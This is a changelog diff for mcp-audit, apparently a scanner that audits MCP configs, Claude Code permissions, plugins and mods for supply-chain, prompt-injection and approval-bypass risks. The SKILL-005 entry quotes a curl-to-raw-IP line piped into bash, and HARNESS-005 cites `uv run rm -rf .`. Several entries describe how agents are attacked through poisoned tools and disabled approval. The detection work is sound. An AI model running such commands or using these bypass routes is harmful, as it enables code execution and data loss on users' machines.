+- **Configs that pair a file, database, secret or shell server with GitHub, GitLab, Slack or Jira report one more finding, HIGH for file and database, CRITICAL for secrets and shell (STORY-0101).** Registry entries keep `network_out` where they had it, so the existing TOXIC-001/003/005/006 finding for the same two servers is still reported beside the new TOXIC-008..011 one, and the score counts both. `mcp-atlassian` alone is still HIGH in `shadow` (it reads local files for attachment upload and posts; TOXIC-001 and TOXIC-008 are both HIGH). `demo/configs/` gives 74 findings on a first scan and 66 after (was 70 and 62).
+- **An attack path between two servers now shows the most severe pair they form (STORY-0101).** When several toxic-flow findings name the same servers, the attack path took whichever was listed first; it now takes the most severe. So a file server next to the GitHub server shows its CRITICAL posting path rather than the HIGH network one, and a server with file read, shell execution and network access (the reference `server-everything`) shows its CRITICAL shell-and-network path, which was hidden behind a HIGH file-read one.
+- **The score's "No prompt injection risks detected" bonus now also needs no DELEG-*
+  finding**, since those are prompt-injection findings too (STORY-0100). Nothing
+  changes for a scan without `--connect`.
+- **Supply-chain evidence no longer quotes credentials.** SC-001..003 and the new SC-007
+  quote the launch command with URL passwords (`postgresql://user:pass@…`, including
+  passwords that contain `@` or spaces) and known token formats replaced by `[REDACTED]`,
+  capped at 300 characters.
+- **Supply-chain checks recognise every spelling of the launcher.** `/usr/local/bin/npx`,
+  an nvm path, `npx.cmd`, `C:\Program Files\nodejs\npx.cmd`, `uvx.exe`, `python3.exe` and
+  `cmd /c npx …` (the form Claude Desktop documents on Windows) used to skip SC-001..004
+  entirely; they now get the same checks as a plain `npx`/`uvx`, with unchanged meaning
+  and severity. The demo count and the false-positive benchmark don't change (they use
+  plain launchers).
+- **A scan reports when the known-malicious data can't be read** (`known-malicious data: …`
+  in the scan's errors) instead of silently matching nothing.
+- **The demo config now shows SC-007 and SC-008.** `demo/configs/vscode_mcp.json`
+  launches `npx -y mcp-server-postgres`, which OSV has listed as malicious
+  (MAL-2026-5481) since June 2026.
+- **The "zero false positives" claim now says what it covers.** README, GAPS.md and the
+  release-notes template said the 22-server benchmark had no poisoning false positives.
+  That is still true, but those fixtures are config entries with no tool descriptions;
+  each now points to the measured numbers above.
+- **TRUST-003 now also runs in a plain scan of the current directory** (STORY-0090).
+  A plain `scan` or `check` run in a repository now reads its root
+  `.vscode/tasks.json` and `.vscode/settings.json`, so a folder-open task like the one
+  the Keyv and Miasma worms planted is named without `--project`. What TRUST-003
+  means and how severe it is are unchanged; `scan --project` still walks the whole
+  tree and doesn't report the same file twice, and a scan run from your home folder
+  skips this check. A `.vscode/` directory that is a symlink is now reported as
+  TRUST-002 (a link out of the repository) instead of its files being read as the
+  repository's own.
+- **`check` no longer says "No MCP config files found" and exits 0 when the scan has
+  findings** (STORY-0089, STORY-0090, STORY-0091). A folder with no MCP config can still
+  carry a planted auto-run file, a git config that runs a command, or a risky CI workflow; its findings now reach the verdict and
+  the exit code. The same applies to a machine with no MCP config whose installed
+  Claude Code plugins or mods have findings (PLUGIN-*, MOD-*): `check` used to exit 0
+  there and now reports them, and exits 1 when one is HIGH or the grade drops below B.
+- **`scan --project` now shows errors from its project pass** (STORY-0093). Errors that a
+  step of the repository's own analysis reported (for example an ignore file the SANDBOX
+  checks could not read) were dropped; they now appear in the scan's errors, once each.
+- **HARNESS-005 now recognises environment runners and PowerShell code-running commands.** An allow rule such as `Bash(devbox run *)`, `Bash(docker exec app *)`, `Bash(uv run:*)`, `Bash(poetry run:*)`, `Bash(pnpm exec:*)` or `PowerShell(iex *)` approves any command, the same as `Bash(npx *)`, and is now reported. If you see a new HARNESS-005 for a rule like `Bash(uv run:*)` that you added so Claude can run your tests: Anthropic's docs say these runners "execute their arguments as a command", so the rule also approves `uv run rm -rf .`; write one rule per command instead, such as `Bash(uv run pytest *)`. A rule that names the inner command, such as `Bash(devbox run npm test)` (Anthropic's recommended form), is not reported. Meaning and severity (MEDIUM) are unchanged.
+
+- **`mcp-audit register` says what registering actually does.** The prompt
+  promised a weekly digest and "early access to new rule packs before public
+  release"; nothing in mcp-audit is held back from unregistered users. It now
+  says registering shares your contact details so you can be contacted about
+  project updates, offers the optional low-grade follow-up, lists what is sent
+  (once, then version and grade on each `check`), and says how to remove it.
+
+### Fixed
+
+- **Terminal output no longer breaks on text a scanned server sent.** A tool name or
+  live description containing something like `[/dim]` made `scan --connect` stop with
+  a Rich markup error before printing its findings, and `[link=…]` rendered as a hidden
+  link. Finding titles, evidence, remediation and server names are now shown as
+  written (STORY-0100).
+- **The privacy page now names the address registration actually sends to.**
+  `docs/privacy.md` said `https://register.mcp-audit.dev/ping`; the code posts to a
+  Pipedream webhook (`https://eo4jvaanlkuohuc.m.pipedream.net`) that emails the
+  author and logs to a Google Sheet. The page now says so, states that nothing is
+  sent unless you run `mcp-audit register`, and corrects four smaller details: the
+  first POST's `grade` is always `"?"`, the request carries six headers (two set by
+  mcp-audit, four added by Python's HTTP library, none identifying you), only
+  `check` (never `scan`) pings, and the Windows file path is
+  `%LOCALAPPDATA%\mcp-audit\mcp-audit\registration.json`. The page now states
+  only what the code does; the list of intended uses and the "not sold or
+  shared" promise are gone. Tests now fail if the page and the code disagree on
+  the address or the fields sent. ADR-0002 keeps its original endpoint decision
+  with a dated note naming the address the code uses.
+- **Research citations corrected.** The Censys post is dated May 27, 2026, not June,
+  and says *many* exposed MCP deployments run without authentication, not most;
+  the AUTH-001 finding text, COMM-031, `PROVENANCE.md` and the severity framework
+  now say that. (The v0.12.0 entry below still carries the old wording.) The arXiv
+  2605.22333 paper's real title is "A First Measurement Study on Authentication
+  Security in Real-World Remote MCP Servers".
+- **The privacy and telemetry pages list every command that uses the network.**
+  They said nothing leaves your machine unless you opt in, but `fix` (even in its
+  dry run), `sbom` and `lock` look up package versions on npm, PyPI or deps.dev by
+  default; each takes `--offline`. The pages, and the README's "offline" bullet,
+  now name them alongside `update-registry`, `verify`, `vet --online`,
+  `push-nucleus`, `register` and Sigstore signing.
+- **Install instructions use the right PyPI name.** Several docs said
+  `pip install mcp-audit`, which is not this project's package; they now say
+  `pip install mcp-audit-scanner`. The VS Code extension is installed from Open VSX
+  (the docs pointed at a Microsoft Marketplace listing that does not exist).
+- **The README describes the badge for an unlisted package correctly.** There is
+  no grey `unknown` badge: an unlisted package's badge URL returns 404. The badge
+  doc's colour table now matches the live badges (`listed`, `verified`, fixed and
+  unfixed CVE counts).
+- **README and docs examples pin the current release.** The GitHub Action example
+  used `@main`, the pre-commit examples used `rev: v0.1.0` (a tag that never
+  existed), and the Action, diff, fix, Snyk, governance and usage docs pinned
+  releases from `v0.3.3` to `v0.17.0` or `@main`. All now name `v0.21.1`; the
+  examples that promise a reproducible run also set the action's `version` input,
+  which otherwise downloads the latest binary. `scripts/update_test_count.py
+  --check` fails a release PR until it updates every pin. The usage guide's Action
+  examples used inputs that never existed (`output-file`, `sast`) and said findings
+  never fail the build; they now use `sarif-output` and `run-sast` and describe
+  `fail-on-findings` correctly. The README's Action input and output table
+  listed inputs that do not exist (`format`, `baseline`) and misspelled the
+  `findings-count` output; it now matches `action.yml`.
+- **GAPS.md lists what a self-hosted runner needs**, including `python3`: without
+  it the Action still scans and fails on findings, but reports `findings-count` 0,
+  `grade` unknown and an empty `sarif-path`, and skips merging `LOCK-*` results.
+- **The README describes rug-pull detection correctly:** a changed entry is
+  flagged once, relative to the last pin or scan, not on every scan after a pin.
+- **The four CodeQL action references are pinned to a commit SHA** (v4.39.1), like
+  every other action this repo uses, and a test now fails on any tag-pinned
+  third-party action.
+- **`docs/owasp-mapping.json` no longer states a hand-typed count** ("103 static
+  finding IDs" while it held 127). Completeness is what CI already checks.
+- **`scan --format json`, `sarif` and `nucleus` (and `--json`) print only the
+  document on stdout (STORY-0103).** With an `mcp-lock.json` present, the
+  `Lock: verified` line and the lock `WARN` lines came first, so the output
+  did not parse; so did the `--project`, `--include-agent-files` and
+  `--include-extensions` summaries. Every such line, and every error, now goes
+  to stderr in those formats; terminal output is unchanged. `check --json`
+  sends a failed registration ping's message to stderr, and with no MCP config
+  found it still writes the JSON document. `lock --verify --format json|sarif`
+  does the same, and its SARIF is no longer broken across lines at 80 columns
+  when piped.
+- **`vet --online` no longer crashes on a malicious-package entry without a
+  link.** An entry from mcp-audit.dev that lacks `link` or `id`, or is not an
+  object, is shown without it instead of stopping with an error.
+- **A Windows `cmd /c` command line with a quoted path is checked.** When the
+  whole line is one argument, such as `"C:\Program Files\nodejs\npx.cmd" -y
+  pkg`, it was split at spaces, so the launcher was never recognised and no
+  supply-chain check ran. It is now split the way Windows programs split a
+  command line (double quotes group, backslashes are literal except before a
+  quote).
+- **The privacy page and README name every network use.** The README said
+  `check` makes no network calls without a flag; after `mcp-audit register`,
+  each `check` sends a short ping with the grade. The privacy page's table now
+  lists `lock --verify --resolve` (npm or PyPI) and `lock --connect` (starts or
+  contacts each configured server), both opt-in.
+- **TRUST-006: a git-lfs custom transfer agent that runs on every transfer is
+  HIGH.** `lfs.customtransfer.<name>.path`/`args` in a repository's git config
+  was MEDIUM even when `lfs.standalonetransferagent` (or
+  `lfs.<url>.standalonetransferagent`) names that agent. git-lfs then runs it on
+  every fetch, pull, checkout and push that moves LFS objects, without asking
+  the server, the same exposure as `core.sshCommand`, which is HIGH. It is HIGH
+  in that case and stays MEDIUM otherwise (it then runs only if the LFS server
+  picks it). **This is a severity change for some legitimate setups:** a
+  repository configured for a standalone agent such as `lfs-folderstore`
+  (LFS objects kept in a shared folder) now gets a HIGH TRUST-006, so `check`
+  exits 1 on it where it exited 0 before. (The PR that made this change, #193,
+  said it changed no severities; that was wrong.)
+- **SANDBOX finding text names the user settings file Claude Code reads.** With
+  `CLAUDE_CONFIG_DIR` set, the notes about `strictAllowlist` and `defaultMode`
+  said "your ~/.claude/settings.json"; they now name that file (as `~/…` when it
+  is under your home directory, otherwise `$CLAUDE_CONFIG_DIR/settings.json`).
+  The fixed text of SANDBOX-001 (`enabled`, `failIfUnavailable`) and the
+  SANDBOX-003 remediation now say "your user settings
+  (`~/.claude/settings.json`, or `$CLAUDE_CONFIG_DIR/settings.json`)" (STORY-0104).
+- **Error and notice lines no longer land in JSON and SARIF output on stdout
+  (STORY-0104).** The `--offline cannot be used with ...` error, the one-time
+  "migrated N state file(s)" notice and, for `check --json`, an unknown
+  `--report` format error and the PDF report lines now go to stderr, so
+  `scan --format json > out.json` and `check --json | jq` get only the document.
+- **`vet --online` no longer crashes on a malformed verdict from mcp-audit.dev
+  (STORY-0104).** A `malicious` item whose `aliases`, `versions` or `ranges` is
+  a number, or whose `id` is a list, raised a `TypeError`; such a field is now
+  skipped (a lone string is shown as one value), and a non-list `malicious`
+  field is treated as empty (no empty "Malicious releases listed" panel). A
+  non-object `registry` is read as not listed, and a non-list
+  `known_vulnerabilities` as none; a vulnerability item that is not an object
+  is still counted and has no recorded fix, so `vet` exits 1 rather than
+  hiding it.
+- **A `$VAR`- or `%VAR%`-rooted path no longer makes a server a poster
+  (STORY-0101 follow-up, STORY-0104).** `$HOME/code/discord` or
+  `${workspaceFolder}/slack` as an argument is now read as a path, like
+  `/Users/...`, and not as the Discord or Slack platform name, so it no longer
+  tags the server `comms_out`.
+- **SKILL-005: a raw-IP fetch after a quoted option value is HIGH again
+  (STORY-0095 follow-up, STORY-0104).** In `curl -s -H 'A: b' 45.33.32.156:8080/x | bash`
+  the space inside the quoted header split it into two words, so the IP was
+  never read and the line was LOW; option values are now split shell-style.
 
 ### Security
 
+- **The HTML dashboard, the fleet report and the PDF report show scan text as
+  text (STORY-0103).** The dashboard and `merge --format html` put server
+  names, finding titles, attack-path hops, client and analyzer names and
+  machine names into the page as HTML, so a server name in a repository's
+  `.mcp.json`, or a tool name a live server chose (a COLLIDE-001 title), could
+  add markup or script to the report you open. Every such string is now
+  escaped, and the "Recommended action" entries no longer use an inline
+  `onclick` built from the server name. The embedded scan data already escaped
+  `<`, `>` and `&`; a server named after a page marker (`__D3_JS__`) no longer
+  breaks the page. The PDF report (`--report pdf`) passed finding titles and
+  server names to reportlab's markup parser: a `<` stopped the report with an
+  error, and a link or image tag was honoured. They are now escaped too.
+
+## [0.21.1] - 2026-10-25
+
+### Security
+
+- **`setuptools` 84.0.0 → 84.2.1 in the lockfile** (GHSA-xmj3-9gf7-h52w, fixed in 84.1.0). Build-time only; it is not in the runtime install. `pillow` 12.3.0 → 13.0.0 and `certifi` 2026.2.25 → 2026.10.19 arrived through Dependabot (#173). `pip-audit` (PyPI and OSV databases) on every package in the refreshed lock reports no known vulnerabilities.
+- **Registry: five advisories added from OSV**, found by the weekly `registry-advisory-sync.yml` check (its first run, 2026-10-19, failed on the first one; the other four were published 2026-10-20). `@modelcontextprotocol/sdk`: CVE-2026-111767, CVE-2026-111768, CVE-2026-111769, CVE-2026-111771 (all fixed in 1.32.0). `mcp` (PyPI): CVE-2026-59951, unbounded StreamableHTTP session accumulation. Its `fixed_in` is 2.2.0, the highest fixed version across OSV's ranges, so a config pinned to the 1.x fix (1.30.0) is still reported; that is the sync script's documented conservative rule. `vet` and SC-004 now report all five. Written with `scripts/sync_registry_advisories.py --write`; nothing removed or rewritten.
+- **Refreshed vulnerable dependencies in the lockfile, which is what the standalone binaries are built from.** `mcp` 1.27.0 → 1.30.0 (CVE-2026-59951, CVE-2026-52870, CVE-2026-52869, CVE-2026-59950), `starlette` 1.0.1 → 1.8.0 (CVE-2026-48817, -48818, -54282, -54283), `python-multipart` 0.0.28 → 0.0.32 (CVE-2026-53538, -53539, -53540), `pydantic-settings` 2.13.1 → 2.16.0 (CVE-2026-58203), `pyasn1` 0.6.3 → 0.6.4 (CVE-2026-59884, -59885, -59886), `pillow` 12.2.0 → 12.3.0 (13 advisories) and, build-time only, `setuptools` 82.0.1 → 84.0.0 (CVE-2026-59890). The `mcp`, `starlette`, `python-multipart` and `pydantic-settings` advisories are in server-side code; mcp-audit uses only the MCP client, for `--connect`. `pyasn1` parses certificates for `--verify-signatures`. `pillow` arrives through `reportlab` for PDF reports. A fresh `pip install` already resolves current versions. `pip-audit` on the refreshed lock reports no known vulnerabilities.
+
+### Changed
+
+- **Releases: merging a version bump to `main` now tags and publishes it.** A new workflow, `release-on-version-bump.yml`, tags the commit that changed the version (never a later commit) and dispatches `release.yml`. A new `gate` job decides for every release run whether it may publish: only a `vX.Y.Z` tag on `main` that matches `pyproject.toml`, has a non-empty CHANGELOG section, and isn't behind an existing release tag. A plain manual dispatch is still a build-only dry run, and pushing a tag by hand still works.
+
+---
+
+## [0.21.0] - 2026-10-13
+
+**Upgrade note:** once anyone commits a lock written with `lock --connect`, mcp-audit
+0.18.0 through 0.20.0 report its `tools` section as unverified, so their
+`lock --verify` exits 1 (waivable with `--allow-unverified`); 0.17.x ignores it.
+Upgrade CI, including any pinned GitHub Action `version`, before that commit. Locks
+written without `--connect` are unchanged.
+
+### Added
+
+- **`lock --connect` records what each server's tools say, not just which server
+  runs** (STORY-0086). It lists every tool each configured server exposes and stores
+  two SHA-256 digests per tool in the lock's `tools` section: one over the whole
+  definition, one over everything except the description and title. Only names and
+  digests are written, never tool text. `lock --verify --connect` compares the live
+  lists against them: **LOCK-006** (HIGH) a tool was added, **LOCK-007** (HIGH) a
+  tool's input schema, output schema, or annotations changed, **LOCK-008** (MEDIUM)
+  only its description or title changed, **LOCK-009** (LOW, does not fail the exit
+  code) a tool was removed. A server that cannot be compared (no record yet, or its
+  tool list could not be read) is reported as unverified, never passed. Verification
+  starts only servers that match the lock, have not drifted, and have a record; an
+  unapproved or changed launch command is reported, not run. ADR-0005 is
+  amended: mcp-audit now owns `tools`, and the section carries its own checksum, so
+  a hand edit to it is **LOCK-005** (CRITICAL), and `lock` refuses to carry a section
+  that fails its checksum forward, while the top-level checksum keeps its old scope.
+  See `docs/lock.md`, "Tool definitions".
+
+### Fixed
+
+- **`scan --connect` dropped every tool's input schema with `mcp` 2.x.** The SDK
+  renamed the attribute, and mcp-audit's `getattr(t, "inputSchema")` quietly returned
+  nothing, so parameter descriptions never reached the poisoning analyzer. Tools are
+  now read in the protocol's own wire format, which works on 1.x and 2.x.
+- **`scan --connect` read only the first page of a paginated tool list.** A server
+  with 250 tools in pages of 100 showed 100. Every page is now read, up to 100 pages;
+  past that, or on an `mcp` release too old to paginate, the scan says the list may
+  be incomplete.
+
+---
+
+## [0.20.0] - 2026-10-13
+
+**Upgrade note:** expect more findings after upgrading, and a few different ones.
+
+- **More CVEs.** The registry now carries each package's advisory history, so SC-004
+  fires for packages that used to look clean.
+- **Lower severity when every advisory has a fix.** SC-004 is MEDIUM when the launch
+  is unpinned and every listed advisory has a fix, and HIGH when an affected version
+  is pinned or an advisory has no fix.
+- **`vet` exits 1 only for a CVE with no fix.** A CI step that relied on `vet` failing
+  for any recorded CVE now passes for packages whose CVEs are all fixed.
+- **New default checks.** A default `scan` now also reports Claude Code mods (MOD-*)
+  and allow rules or bypass setups that don't hold (HARNESS-005/006).
+
+### Fixed
+
+- **Rug-pull docs say what the code hashes (STORY-0084).** The README said rug-pull
+  detection compared hashes of tool descriptions. It compares each server's
+  configuration entry (command, arguments, environment variable names, raw entry);
+  live tool definitions from `--connect` were never hashed. README, enterprise
+  deployment notes, the test matrix and the Snyk integration page now say so.
+  Detection is unchanged.
+- **The registry now lists the CVEs its packages actually have (STORY-0083).**
+  47 of 53 entries listed none, so the default scan and `vet` called MCP Inspector
+  clean despite its unauthenticated RCE (CVE-2025-49596). A new
+  `scripts/sync_registry_advisories.py` pulls advisories from OSV; its first run
+  added 144 across 10 entries, including server-filesystem, server-git, both MCP
+  SDKs, Playwright MCP, mcp-server-kubernetes and 113 for `flowise`. `mcp-remote`
+  (614K weekly downloads, CVE-2026-51996 rated 9.8) joins the registry.
+- **SC-004 severity now depends on whether a fix exists (STORY-0083).** HIGH when
+  the config pins an affected version or an advisory has no recorded fix; MEDIUM
+  when the launch is unpinned and every advisory is fixed. Descriptions list at
+  most 10 advisory IDs and point to `vet` for the rest. GHSA-only advisories link
+  to GitHub instead of NVD.
+- **`vet` no longer fails on a package's fixed past (STORY-0083).** It exits 1 only
+  when a recorded CVE has no fix (or for a typosquat, or an unknown package with
+  `--strict`). `vet` takes no version, so it answers for the latest release; CVEs
+  with a fix are still listed, with their fixed version. Without this, the full
+  advisory history would have made `vet` fail for the official filesystem server.
+- **PLUGIN-001 no longer claims to catch Plugin4Shell (STORY-0080).** The finding,
+  README and docs said a mismatch between a plugin's recorded version and its
+  marketplace pin was the on-disk symptom of Plugin4Shell. In Plugin4Shell the agents
+  reported a clean install at the pinned commit after a swap, so the record can match
+  the pin, and PLUGIN-001 does not hash plugin files. The finding text and docs now describe it as a
+  pin-drift check. Detection logic is unchanged.
+
+### Added
+
+- **What replaced the approval prompt (STORY-0087).** HARNESS-005 (MEDIUM) flags allow
+  rules that approve every argument to a command that can write, run code or reach the
+  network, such as `Bash(gh:*)`, `Bash(curl *)` or `Bash(python3:*)`, and `git push`,
+  `npm publish` or `gh api` even when narrowed. HARNESS-006 (MEDIUM) flags a settings
+  file that turns approval off with no deny rule for recursive deletes and no
+  PreToolUse hook on shell commands.
+- **Claude Code mods audit (STORY-0085).** Mods (Claude Code 2.1.287, 2026-10-01) are
+  plugins that run code inside Claude Code, unsandboxed, with your permissions. A
+  default `scan` and `plugins scan` now read each mod's hooks module statically
+  (installed plugins, Claude-written dev mods in `~/.claude/dev-mods`, and
+  `CLAUDE_CODE_PLUGIN_DIRS`) and apply Anthropic's own review checklist: MOD-001
+  (HIGH) the mod can approve tool calls before the permission prompt; MOD-002 (HIGH
+  or MEDIUM) it can read secrets or files and make network requests; MOD-003 (MEDIUM) it
+  rewrites tool descriptions or prompts; MOD-004 (MEDIUM) it starts programs; MOD-005
+  (INFO) inventory; MOD-006 (MEDIUM) `CLAUDE_CODE_PLUGIN_DIRS` set in settings.
+  Findings say whether a managed settings file (and so the built-in guard) was found.
+  `plugins discover` gains a Mod column.
+- **Weekly registry advisory check (STORY-0083).** `registry-advisory-sync.yml`
+  runs the sync in `--check` mode every Monday and fails when the registry is
+  missing an advisory OSV knows about. It never writes the registry.
+
+---
+
+## [0.19.1] - 2026-10-12
+
+### Fixed
+
+- **A scan run inside a repository now reads its Claude Code settings
+  (STORY-0082).** `.claude/settings.json` and `.claude/settings.local.json` in the
+  working directory are discovered alongside `.mcp.json` (client
+  `claude-code-project`), so HARNESS-001..004 and HOOK-001/002 see repository
+  settings in the GitHub Action's default run. Before this, a pull request that
+  switched approval off passed CI unless `config-paths` named the file. Prompted
+  by user feedback on the v0.19.0 announcement. An explicit `--path` is
+  unchanged.
+
+---
+
+## [0.19.0] - 2026-10-11
+
+**Upgrade note:** a default `scan` (and `check`, `dashboard`, `shadow`, `sbom`) now
+also reads `~/.claude/settings.json` and installed Claude Code plugins, so a
+developer machine can show new findings and a lower grade after upgrading. That is
+the point: both surfaces were live and unscanned. `--no-plugins` drops the plugin
+part; an explicit `--path` scans exactly what it names, as before.
+
+### Added
+
+- **Two verified registry entries from community submissions:** `hol-guard`
+  (PyPI, [#135](https://github.com/adudley78/mcp-audit/issues/135), submitted by
+  [@kantorcodes](https://github.com/kantorcodes)) and `@autoposting.ai/cli`
+  (npm, [#134](https://github.com/adudley78/mcp-audit/issues/134), submitted by
+  [@uditgoenka](https://github.com/uditgoenka)). Both maintainers are credited in
+  `docs/contributors.md`.
+- **Prachet Poddar credited in `docs/contributors.md`** under a new Research and
+  Design Contributors section, for the measurements and `mcp-lock.json` format work
+  the docs cite ([#88](https://github.com/adudley78/mcp-audit/issues/88)).
+- **Registry advisory data (STORY-0078):** `mcp-atlassian` now carries all 24 CVEs
+  PyPI's vulnerability data lists for releases before 0.22.0 (it had one), with
+  `fixed_in` per CVE, and its capabilities add `file_read` and `file_write` (its
+  attachment tools read and write local files, confirmed in the v0.23.1 source).
+  New unverified entry `@toolbox-sdk/server` (Google's MCP Toolbox, npm) with
+  CVE-2026-14540, fixed in 1.5.0. Registry is now 53 entries.
+- **Harness posture checks, HARNESS-001..004 (STORY-0079).** Claude Code settings
+  that switch human approval off: `permissions.defaultMode: bypassPermissions`
+  (HIGH), `enableAllProjectMcpServers: true` (HIGH),
+  `skipDangerousModePermissionPrompt: true` (MEDIUM), and a blanket `Bash` /
+  `Bash(*)` allow rule (HIGH). Basis: HarnessSecurity-Bench (arXiv 2610.07639),
+  where auto-approve raised attack success from 29.2% to 95.6%.
+- **`~/.claude/settings.json` is now discovered.** It holds user-level permissions
+  and hooks, so HOOK-001/002, CFHYG-005/006 and the new HARNESS checks now see
+  user-level settings that were previously never read.
+- **Claude Code plugins (STORY-0080).** `mcp-audit plugins discover` / `plugins scan`,
+  and a default `scan` now includes installed plugins (`--no-plugins` to skip; an
+  explicit `--path` skips them too). PLUGIN-001 (MEDIUM): a git plugin's recorded version
+  is not the commit its marketplace pins, the on-disk symptom of Plugin4Shell (AIR
+  Security, 2026-09-17). PLUGIN-002 (LOW): a git plugin source with no `sha` pin. The
+  skills and commands plugins ship go through the agent-file checks (with
+  `--include-agent-files`), and the MCP servers they declare go through the full
+  analyzer pipeline as client `claude-code-plugin`. `lock` never records plugin
+  servers. Offline; reads only Claude Code's own plugin records.
+- **SAST rules for SSRF guards that only block IP literals (STORY-0081).**
+  `mcp-ssrf-ip-literal-only-guard` (Python) and `mcp-ts-ssrf-ip-literal-only-guard`
+  (TypeScript) flag a guard that checks a URL's host with `ipaddress.ip_address()` /
+  `net.isIP()` / ipaddr.js and lets hostnames through unresolved, the bug in the Wazuh
+  MCP server advisory GHSA-pw2j-pj4h-f5vg. The existing CVE-tied rule
+  `mcp-tool-arg-url-ssrf-param` missed the inline form, because it treats any
+  `urlparse()` call as validation. Vulnerable and clean fixtures added for both
+  languages. SAST pack is now 91 rules (47 Python, 44 TypeScript).
+
+### Changed
+
+- **SC-004 emits one finding per package, and is version-aware for exact pins
+  (STORY-0078).** A package with several advisories now produces one HIGH finding
+  listing them, instead of one per CVE. When the config pins an exact version at
+  or above a CVE's `fixed_in`, that CVE is dropped; if all are, no finding.
+
+### Fixed
+
+- **Pinned package specs now match the registry.** `npx @scope/pkg@1.2.3` and
+  `uvx pkg==1.2.3` never matched their registry entry, so SC-004, typosquat
+  detection and TRANSPORT-003's registry tiering silently skipped pinned configs.
+- **`docs/lock.md` credited Prachet Poddar with the wrong GitHub link and a project
+  name he never used.** It now links his account and the generator
+  (`code/mcp_lock.py`) and spec in his `mcp-supply-chain-study` repository.
+
+---
+
+## [0.18.2] - 2026-09-13
+
+### Fixed
+
+- **`scan`/`check` auto-verify no longer reports every locked server as both
+  unlocked and missing (R60-01).** `mcp-audit lock` → `lock --verify` (exit 0)
+  → `mcp-audit check` used to grade D/F with `LOCK-002` and `LOCK-003` for the
+  same server, because matching used the `<client>/<name>` key and the client
+  label differs across discovery paths (`claude-code` vs `claude-code-project`
+  vs `custom`). Matching is now by **(config path relative to the lock root,
+  server name)**. The lock file's key strings and `lock_version` are unchanged.
+  A config outside any lock root produces no LOCK findings and one WARN.
+  `mcp-lock.json` is never ingested as a config (by name and by a top-level
+  `lock_version` key).
+- **`fix --fix-type credentials` remediates CRED-003 (R60-02).** Header-embedded
+  secrets were advertised as auto-fixable by `check` but filtered out before
+  the credentials strategy ran. The `Bearer ` scheme prefix is preserved.
+- **Install hints name the real distribution and keep extras visible.**
+  `--connect` / SBOM / snapshot messages now say `mcp-audit-scanner[mcp]` /
+  `[sbom]` / `[attestation]`; Rich no longer swallows the bracketed extra.
+- **README no longer claims the published advisory feed is unsigned.** The
+  weekly feed has been signed with the project minisign key since 2026-09-07;
+  the record format remains experimental. `examples/feed/` stays unsigned.
+- **`check` CFHYG-* remediation hints describe the finding they sit under.**
+  The six rows were systematically offset (world-readable → "pin a version").
+
+---
+
+## [0.18.1] - 2026-09-12
+
+### Added
+
+- **`mcp-audit lock` now flags deprecated packages: new `SC-005` finding (STORY-0073).** When
+  `lock` (or `lock --verify --resolve`) resolves an unpinned spec to a version the package registry
+  itself marks deprecated (npm's `deprecated` field on `dist-tags.latest`), the lock entry's
+  `package.deprecated` records the registry's own message and mcp-audit emits one `SC-005`
+  (MEDIUM, `analyzer: "supply_chain"`) naming the package, version, and message. Fires only at
+  `lock` resolution and `lock --verify --resolve` — never from a plain offline `scan`, `vet`
+  (without `--online`), or `scan --check-vulns` (deferred to STORY-0074). PyPI is not covered; see
+  `GAPS.md`. See `docs/lock.md` and ADR-0005's dated addendum.
+
+---
+
+## [0.18.0] - 2026-09-12
+
+> **Why a minor bump, not a patch:** this release ships the R56 exit-code behaviour change
+> documented under Changed below. A CI pipeline that is passing today on v0.17.0 because of that
+> gap can start failing on this version with no config change on the caller's side — that is a
+> minor-version-worthy signal under 0.x, not a patch.
+
+### Added
+
+- **README now opens with the `lock` → `verify` → `accept` workflow and ships a reproducible
+  `demo/lock/` fixture that produces the exact output shown (STORY-0072).**
+
+### Changed
+
+- **BEHAVIOUR CHANGE: `lock --verify` now exits non-zero over unresolved/unverified state, not
+  just over drift findings (R56).** Reported by [issue #88](https://github.com/adudley78/mcp-audit/issues/88)
+  (Finding 2): a locked entry whose version was never resolved (`package.source == "unresolved"`,
+  e.g. locked `--offline`) and a foreign top-level section (`trees`, `tools`, or anything else
+  mcp-audit does not write) that is genuinely populated by another producer were both already
+  reported honestly in the printed summary and in `--format json` — but neither affected the exit
+  code, and the exit code is the only thing CI reads. **A CI pipeline that is passing today because
+  of this gap may start failing after upgrading.** mcp-audit's own default stubs (`trees: {}`,
+  `tools: null`, written on every `lock` run) are explicitly exempt — a project that has never run
+  a `trees` generator sees no change. Use the new `--allow-unverified` flag to waive unresolved
+  entries and populated foreign sections from the exit code; it prints exactly what it waived and
+  never waives an actual `LOCK-001`/`002`/`004`/`005` finding. This is a bare exit-code change, not
+  a new finding ID — the underlying facts (`unresolved_entries`, `unverified_sections`, and the new
+  per-item `unverified`/`reason` detail) were already surfaced; only the exit code lagged behind
+  them. `--format json` gains `unverified` (per-item `{kind, name, reason}`) and `waived` fields.
+  See `docs/lock.md`'s "Unverified state now fails the exit code" section and
+  `docs/decisions/ADR-0005-mcp-audit-lock.md`'s R56 addendum. This release makes no severity
+  changes to the underlying findings themselves — for reference, unchanged from v0.17.0:
+  **LOCK-001** (HIGH), **LOCK-002** (HIGH), **LOCK-003** (MEDIUM), **LOCK-004** (HIGH; CRITICAL
+  for a same-version hash change), **LOCK-005** (CRITICAL).
+
+### Fixed
+
+- **The evergreen GitHub Release template (`.github/release-notes-template.md`) undersold two
+  detection counts and named a shipped feature as unshipped (R51).** "Prompt injection / tool
+  poisoning" said 11 patterns; `len(PATTERNS)` in `analyzers/poisoning.py` is 12. "Credential
+  exposure" said 9 patterns; `len(SECRET_PATTERNS)` in `analyzers/credentials.py` is 17. The
+  advisory-feed line said "experimental until a project signing key ships" — the key shipped in
+  R32 and the published feed has been signed with it since 2026-09-07; the line now says so, while
+  still flagging that the advisory record *format* remains experimental (don't build automation on
+  today's exact field layout). Matching stale counts in `README.md` and `GAPS.md` are corrected
+  too. `tests/test_release_notes_facts.py`'s two pattern-count tests now import `PATTERNS` /
+  `SECRET_PATTERNS` directly and assert against `len()`, not just against each other — the old
+  cross-check form let both docs drift to the same wrong number without ever failing. Everything
+  else in that template block (SAST rule count, exploit-fixture count, the 22-server false-positive
+  benchmark, test count, client list) was checked against the code/repo and still holds; no fix
+  needed there. This fix applies from the next tag — the already-published v0.16.0/v0.17.0 Release
+  bodies are not retroactively edited.
+
+---
+
+## [0.17.0] - 2026-09-10
+
+> **Correction (2026-09-10):** this section originally misstated the LOCK finding severities and,
+> most importantly, LOCK-005's meaning — it was described as an informational note about an
+> unresolved `--offline` entry; the shipped code's LOCK-005 is the CRITICAL tamper/hand-edit check
+> that short-circuits every other check with exit code 2. The text below now matches
